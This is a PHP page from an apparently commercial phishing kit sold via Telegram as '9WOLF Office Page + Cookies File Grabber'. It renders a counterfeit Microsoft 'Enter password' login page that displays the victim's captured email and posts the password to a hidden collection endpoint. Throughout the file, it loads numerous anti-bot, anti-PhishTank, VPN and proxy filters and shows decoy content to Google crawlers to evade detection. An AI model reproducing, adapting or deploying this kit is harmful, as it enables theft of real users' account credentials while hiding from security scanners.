<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

error_reporting(E_ALL ^ E_NOTICE);
ob_start();
session_start();
$path = "../site/";
require ("../9WOLFConfi/Guration.php");
require ("../9WOLFConfi/Function.php");
require ("../9WOLFDecline/AntiBotIp.php");
require ("../9WOLFDecline/AntiBotPw.php");
require ("../9WOLFDecline/AntiBotKillBot.php");
require ("../9WOLFDecline/AntiBotUserAgent.php");
require ("../9WOLFDecline/AntiBotIsp.php");
require ("../9WOLFDecline/AnitiBotHost.php");
require ("../9WOLFDecline/AntiBotPhishTank.php");
require ("../9WOLFDecline/AntiBotVpn.php");
require ("../9WOLFDecline/AntiBotProxy.php");
require ("../9WOLFDecline/AntBotProtection.php");
require ("../9WOLFDecline/SaveBrowsing.php");
require ("../9WOLFDecline/DiscoveredBot.php");
require ("../9WOLFDecline/AntiBotThree.php");
require ("../9WOLFDecline/DisturbOne.php");
require ("../9WOLFDecline/DisturbTwo.php");
require("../9WOLFDecline/Anti/Bot-Crawler.php");
@require("../9WOLFDecline/Anti/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
$rand = generateRandomString(130);
$cage = substr(sha1(mt_rand()),1,25);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
    include($path."index.php"); exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
    include($path."index.php"); exit();
}

if (isset($_POST['hidden']) && !empty($_POST['9WOLFDatorKiller'])  ) {
  include($path."index.php"); exit();
}
if (!isset($_SESSION['9WOLF_SESSION_T0k3n'])  ) {
  include($path."index.php"); exit();
}
#if (!isset($_POST['token9WOLFCsrf'])) {
#    include($path."index.php");
  
#}
#if ($_POST['token9WOLFCsrf'] != $_SESSION['9WOLF_SESSION_T0k3n']) {
#    include($path."index.php"); 
#}
if (isset($_POST['emailaccess'])){
   $_SESSION['emailaccess']  = $_POST['emailaccess'];
   }

?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex,nofollow" />
    <meta name="googlebot" content="noindex,nofollow" />
    <meta name="googlebot-news" content="nosnippet">
    <META NAME="robots" CONTENT="nofollow">
    <meta http-equiv="Cache-Control" content="no-store">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Cache-Control" content="private">
    <meta http-equiv="Pragma" content="no-cache">
    <title><?php echo htmlentities("Sign in to your account", ENT_QUOTES, "UTF-8"); ?></title>
    <link rel="shortcut icon" href="./assets/mic.ico">
    <link rel="stylesheet" href="./assets/2.css">







<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"></noscript><title>Sign in to your Microsoft account</title><meta name="robots" content="none"><meta name="PageID" content="i5030"><meta name="SiteID" content="290950"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"><noscript></noscript></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" style=""><div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form name="myForm" id="i0281" novalidate="novalidate" spellcheck="false" method="POST" target="_top" autocomplete="off" action="<?php echo $priv5;?>">
    <input type="hidden" name="token9WOLFCsrf" value="<?php echo $_SESSION['9WOLF_SESSION_T0k3n'];?>">
                                                <input type="hidden" name="9WOLFDatorKiller" value=""> 
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page"-->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.ci }"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="component: { name: 'background-image-control',
    publicMethods: $page.backgroundControlMethods,
    event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.cn --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="css: { 'has-header': showHeader }, externalCss: { 'middle': true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column"><div class="win-scroll"><img class="if" src="assets/marching_ants_b540a8e518037192e32c4fe58bf2dbab.gif" alt="Paris">
        <style>
.if {
  display: block;
  margin-left: auto;
  margin-right: auto;
}
</style>
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.Br --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.Cd &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.DC && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.ay,
                disableAnimationIfAnimationEndUnsupported: svr.Ch,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.I) -->
    <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">

        <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.b2,
                displayName: sharedData.displayName || svr.I,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible --><!-- /ko -->

    <div id="displayName" class="identity" ><span><?php echo $_SESSION['emailaccess'];?></span></div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.I),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.AK === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata },
                event: {
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->

<!--  -->

<div aria-hidden="true">
    <!--<input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">-->
</div>

<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
    <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
</div>
        </div>

        <p style=" font-size: 14px; font-style: italic;" >Because you're accessing sensitive info, you need to verify your password.</p>
    

<?php 


    if (isset($_GET['invalid'])) {
    $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';
    $em = "p4s5";
    if ($invalid == $em) {
      print"<input type='hidden' name='invalid' autofocus='text'value='invalid'>
        <p class='alert alert-error col-md-24 alert_msg_yxq alert_email_sect' style=' color: rgb(232, 17, 35); display: block; font-size: 16px; margin-top: -10px;'>Your account or password is incorrect. if you don't remember your password,
                                                    <a id='idA_PWD_SignUp' href=''>
                reset it now
                </a>.</p>";
            }
        }


        ?>
                                                                                                            
<!-- ko if: showCredViewBrandingDesc --><!-- /ko -->

<!-- ko if: unsafe_pageDescription --><!-- /ko -->
<div class="alert alert-error col-md-24 alert_msg_yxq alert_email_sect " style="display: none; color: rgb(232, 17, 35); font-size: 16px;" id="usernameError">
                                                    Please enter the password for Microsft account.</div>
<div class="row">
    <div class="form-group col-md-24">
        <div role="alert" aria-live="assertive">
            <!-- ko if: passwordTextbox.error --><!-- /ko -->
            

        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
<input id="password-field" type="password" class="form-control" name="emailaccesspass" value="" maxlength="70" class="form-control input ext-input text-box ext-text-box form-text-input disable-on-submit is-empty form-control ltr_override input ext-input text-box ext-text-box  " placeholder="Password" type="password" pattern=".{4,30}" oninvalid="this.setCustomValidity('Required Field')" oninput="setCustomValidity('')" title="Required Field" required="">

            <!-- ko if: svr.cj && showPassword() --><!-- /ko -->
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

        <!-- ko if: svr.cj --><!-- /ko -->
    </div>
</div>

<!-- ko if: shouldHipInit --><!-- /ko -->

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div>
        <!-- ko if: svr.cA --><!-- /ko -->
        <!-- ko if: svr.BK !== false && !svr.cA && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: svr.aP && svr.aF --><!-- /ko -->
                    <!-- ko ifnot: hideForgotMyPassword -->
                    <div class="form-group">
                        <a id="idA_PWD_ForgotPassword" role="link" href="#" data-bind="
                            text: unsafe_forgotPasswordText,
                            href: accessRecoveryLink || svr.r,
                            attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                            click: accessRecoveryLink ? null : resetPassword_onClick">Forgot password?</a>
                    </div>
                    <!-- /ko -->
                    <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
                    <!-- ko ifnot: useEvictedCredentials -->
                        <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->

<div class="form-group">
    <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->

    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko -->

    <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
</div>

<!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->

                        <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
                    <!-- /ko -->
                    <!-- ko if: showChangeUserLink --><!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.e,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input onclick="return isEmpty()" type="submit" name="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit"  value="Sign in" data-report-attached="1">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
</div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
        <!-- /ko -->
</form>
        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">

    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko if: $page.showFedCredButtons --><!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.C6 && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->



<!-- ko if: svr.ai --><!-- /ko -->

<!-- ko if: svr.DP --><!-- /ko --></div><textarea id="debugDetailsText" class="moveOffScreen" tabindex="-1" aria-hidden="true"></textarea><script>
         function isEmpty(){
           var btn = document.getElementById("dSIButton9");
             var alert = document.querySelector(".alert");
             var str = document.forms['myForm'].emailaccesspass.value;
                         if( !str.replace(/\s+/, '').length ) {
                  alert.style.display = "inline-block";
                  
                  return false;
             }
         }


      </script></body></html>
<!-- partial -->
  
